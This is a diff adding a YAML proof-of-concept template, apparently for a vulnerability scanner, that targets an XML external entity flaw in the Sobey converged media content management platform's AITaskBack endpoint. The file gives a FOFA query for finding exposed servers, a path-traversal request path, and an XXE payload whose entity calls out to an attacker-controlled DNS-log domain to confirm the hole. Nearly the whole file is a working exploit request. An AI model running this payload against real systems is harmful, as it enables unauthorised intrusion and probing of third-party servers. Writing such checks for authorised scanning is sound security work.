@@ -1,0 +1,23 @@
+id: poc-yaml-sobey-imcmp-aitaskback-xxe
+info:
+  name: 索贝融合媒体内容管理平台 AITaskBack XML外部实体注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /sobey-mchEditor/js/%2e%2e/mch/AIInt/AITaskBack?contentid=1&token=&siteCode=
+  headers:
+    Content-Type: application/xml
+  data: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY\
+    \ xxe SYSTEM \"http://{{.domain}}\">\n]>\n<root>\n  <TextResult>&xxe;</TextResult>\n\
+    </root>"
+  expression: status_code == 500 && contains(body,"Sobey") && contains(body,"AITaskBack")
+    && contains(body,"Request processing failed") && reverse.Verify()
+transport: http
